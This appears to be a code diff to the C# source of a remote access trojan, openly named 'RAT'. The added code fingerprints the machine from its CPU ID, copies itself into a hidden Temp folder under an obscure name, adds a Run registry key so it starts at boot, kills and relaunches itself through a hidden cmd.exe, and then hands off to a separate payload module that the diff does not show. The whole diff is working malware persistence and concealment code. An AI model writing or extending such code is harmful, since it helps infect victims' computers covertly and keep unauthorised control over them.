@@ -1,10 +1,19 @@
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Management;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
+
 
 namespace RAT
 {
@@ -13,10 +22,41 @@ namespace RAT
         /*
          * This is a RAT to remove please redownload and execute <Filename>.exe /clean
          * 
-         * 
-         * 
          */
         public static String ran = "";
+        public static String SystemID;
+        public static String ProccessName = ProccessNameShort + ".exe";
+        public static String ProccessNameShort = "CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316ieh2812812390dsfhfd8uasfi2823";
+
+        public static string CreateMD5(string input)
+        {
+            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
+            {
+                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
+                byte[] hashBytes = md5.ComputeHash(inputBytes);
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < hashBytes.Length; i++)
+                {
+                    sb.Append(hashBytes[i].ToString("X2"));
+                }
+                return sb.ToString();
+            }
+        }
+        public static String uid()
+        {
+            string cpuInfo = string.Empty;
+            ManagementClass mc = new ManagementClass("win32_processor");
+            ManagementObjectCollection moc = mc.GetInstances();
+            foreach (ManagementObject mo in moc)
+            {
+                if (cpuInfo == "")
+                {
+                    cpuInfo = mo.Properties["processorID"].Value.ToString();
+                    break;
+                }
+            }
+            return CreateMD5(cpuInfo).Substring(0, 20);
+        }
         public static void random()
         {
             Random rnd = new Random();
@@ -27,89 +67,98 @@ namespace RAT
             }
         }
         public static String[] files = new string[]
-            {
-            Path.GetTempPath()+"CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316"
-            };
-        static void Main(string[] args)
         {
+            Path.GetTempPath()+SystemID
+        };
+
+        static void Main(String[] args)
+        {
+            SystemID = "LOG_" + uid();
             try
             {
                 random();
-                Console.WriteLine("[!] Starting");
                 try
                 {
-                    if (args[0].Contains("clean")) { Console.WriteLine("Cleaning"); }
+                    if (args[0].Contains("clean")) { cleanup(); }
                 }
                 catch { }
-                Console.WriteLine("[!] Skipping Clean");
-                Console.WriteLine("[!] Hiding");
                 try
                 {
-                    String[] fileloc = File.ReadAllLines(files[0]);
-                    if (System.Reflection.Assembly.GetExecutingAssembly().Location.Contains(Path.GetTempPath() + fileloc[0]))
+                    if (System.Reflection.Assembly.GetExecutingAssembly().Location.Contains(Path.GetTempPath() + SystemID))
                     {
                         Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Adds to startup programs
-                        key.SetValue(fileloc[0], System.Reflection.Assembly.GetExecutingAssembly().Location);
+                        key.SetValue(SystemID, System.Reflection.Assembly.GetExecutingAssembly().Location);
                         /*
                          * START PAYLOAD HERE
                          */
-
-
-
-                        Console.WriteLine("[!] WOW now we are here! " + System.Reflection.Assembly.GetExecutingAssembly().Location);
-                        Console.ReadLine();
+                        Directory.SetCurrentDirectory(Path.GetTempPath() + SystemID);
+                        RAT.Payload.main();
+                    }
+                    else
+                    {
+                        Hide();
                     }
                 }
-                catch (Exception e) { Console.WriteLine(e); }
-                Hide();
-                Console.WriteLine("[!] Hiding Done");
+                catch (Exception e)
+                {
+                    Hide();
+                }
                 Console.ReadLine();
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e);
+                Console.ReadLine();
             }
         }
         public static void Hide()
         {
+            try
+            {
 
-            try
-            {
-                using (StreamWriter sw = File.CreateText(files[0]))
+                if (Directory.Exists(Path.GetTempPath() + "\\" + SystemID))
                 {
-                    sw.Write(ran);
+                    Directory.Delete(Path.GetTempPath() + "\\" + SystemID);
+                    Directory.CreateDirectory(Path.GetTempPath() + SystemID);
+                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
+                    restart();
                 }
-            }
-            catch { }
-            String[] loc = File.ReadAllLines(files[0]);
-            bool found = false;
-            foreach (String check in loc)
-            {
-                if (Directory.Exists(Path.GetTempPath() + check))
+                else
                 {
-                    found = true;
-                    break;
+                    Directory.CreateDirectory(Path.GetTempPath() + SystemID);
+                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
+                    restart();
                 }
-            }
-            try
-            {
-                Directory.CreateDirectory(Path.GetTempPath() + loc[0]);
-                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + loc[0] + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
-                restart(loc[0]);
             }
             catch
             {
-                restart(loc[0]);
+                restart();
             }
         }
-        public static void restart(String loc)
+        public static void restart()
         {
             try
             {
-                System.Diagnostics.Process.Start(Path.GetTempPath() + loc + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
+                String exec = " taskkill /f /im " + ProccessName;
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/C " + exec;
+                process.StartInfo = startInfo;
+                process.Start();
+            }
+            catch { }
+
+            try
+            {
+                System.Diagnostics.Process.Start(Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
                 System.Environment.Exit(1);
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e);
+                Console.ReadLine();
                 cleanup();
             }
 
@@ -119,7 +168,7 @@ namespace RAT
             String[] fileloc = File.ReadAllLines(files[0]);
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.DeleteValue(fileloc[0], false);
-            String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe";
+            String exec = " taskkill /f /im " + Program.ProccessName;
             System.Diagnostics.Process process = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
